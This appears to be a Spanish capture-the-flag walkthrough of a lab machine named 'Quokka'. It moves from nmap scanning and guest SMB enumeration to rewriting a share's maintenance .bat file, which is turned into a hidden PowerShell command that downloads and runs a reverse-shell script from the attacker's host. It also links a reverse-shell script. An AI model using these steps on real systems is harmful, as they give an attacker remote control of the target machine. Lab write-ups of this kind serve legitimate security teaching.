---
description: '🔍 Dificultad: Principiante'
---

# Quokka

### 🔍 **RECONOCIMIENTO**

En primer lugar, tras conectarnos a la máquina, utilizamos el comando:

```bash
ping -c 1 192.168.1.57
```

para verificar la conectividad de red.

<figure><img src="../../.gitbook/assets/image (994).png" alt=""><figcaption></figcaption></figure>

A continuación, se realiza el comando:

```bash
nmap -p- --open 192.168.1.57 --min-rate 5000 -n
```

para realizar un escaneo de puertos y servicios detallado en la dirección IP.

<figure><img src="../../.gitbook/assets/image (995).png" alt=""><figcaption></figcaption></figure>

Como resultado del escaneo, se identificaron los siguientes puertos abiertos y sus servicios asociados:

* **80/tcp**: Corresponde al servicio HTTP, utilizado para tráfico web no cifrado.
* **135/tcp**: Relacionado con el servicio MSRPC (Microsoft Remote Procedure Call).
* **139/tcp**: Asociado al protocolo NetBIOS-SSN, usado para compartir recursos en redes locales.
* **445/tcp**: Corresponde al servicio Microsoft-DS (Server Message Block, SMB) para compartir archivos e impresoras.
* **5985/tcp**: Utilizado por WSMan (Windows Remote Management).
* **47001/tcp**: Asociado al servicio WinRM (Windows Remote Management).
* **49664-49670/tcp**: Puertos abiertos con servicios desconocidos, posiblemente usados por aplicaciones específicas o dinámicas del sistema.

A continuación, se realizará un análisis más detallado de los servicios activos en estos puertos.

### 🔎 **EXPLORACIÓN**

Se utiliza el comando:

```bash
sudo nmap -sCV -p80,135,139,445,5985,47001,49664-49670 -v 192.168.1.57
```

para obtener más información sobre ese puerto específicamente.

<figure><img src="../../.gitbook/assets/image (996).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (997).png" alt=""><figcaption></figcaption></figure>

El análisis identificó la presencia de un servidor IIS y un servicio Samba en el sistema.

<figure><img src="../../.gitbook/assets/image (998).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (999).png" alt=""><figcaption></figcaption></figure>

En la página web encontramos algo que nos podría ayudar como Daniel, Luis y “Quokka” deben revisar un servicio secundario que opera con privilegios elevados. Curiosamente, estos nombres coinciden con los usuarios listados en la sección de contacto del portal. Esta pista sugiere que el servicio Samba podría contener información relevante o ser un punto de interés.

```bash
netexec smb 192.168.1.57 -u 'guest' -p '' --shares
```

<figure><img src="../../.gitbook/assets/image (1000).png" alt=""><figcaption></figcaption></figure>

Nos conectamos.&#x20;

```bash
smbclient //192.168.1.57/Compartido -U guest -N
```

<figure><img src="../../.gitbook/assets/image (1001).png" alt=""><figcaption></figcaption></figure>

Entre todos nos llama la atención el archivo **mantenamiento.bat**.

<figure><img src="../../.gitbook/assets/image (1003).png" alt=""><figcaption></figcaption></figure>

Nos los descargamos para ver su contenido.

<figure><img src="../../.gitbook/assets/image (1004).png" alt=""><figcaption></figcaption></figure>

### 🚀 **EXPLOTACIÓN**

Modificamos el archivo para ejecutar una Reverse Shell.

```
@echo off

:: Reverse shell a Kali
powershell -NoP -NonI -W Hidden -Exec Bypass -Command "iex(New-Object Net.WebClient).DownloadString('http://192.168.1.56:8000/shell.ps1')"

:: Fin del script
exit
```

{% @github-files/github-code-block url="https://github.com/MartinSohn/PowerShell-reverse-shell/blob/main/powershell-reverse-shell.ps1" %}

Debemos configurar un servidor para que el script pueda obtener la shell y enviárnosla de vuelta. Para ello, abriremos un servidor en Python y pondremos un puerto en escucha.

<figure><img src="../../.gitbook/assets/image (1006).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1005).png" alt=""><figcaption></figcaption></figure>

### 🔐 PRIVILEGIOS

<figure><img src="../../.gitbook/assets/image (1007).png" alt=""><figcaption></figcaption></figure>

Ya somos **root**.&#x20;

Te deseo mucho éxito en tu búsqueda de las flags! Recuerda prestar atención a cada detalle, examinar los archivos y servicios con detenimiento, y utilizar todas las herramientas disponibles para encontrarlas. La clave para el éxito está en la perseverancia y en no dejar ningún rincón sin explorar. ¡Adelante, hacker! 💻🔍🚀
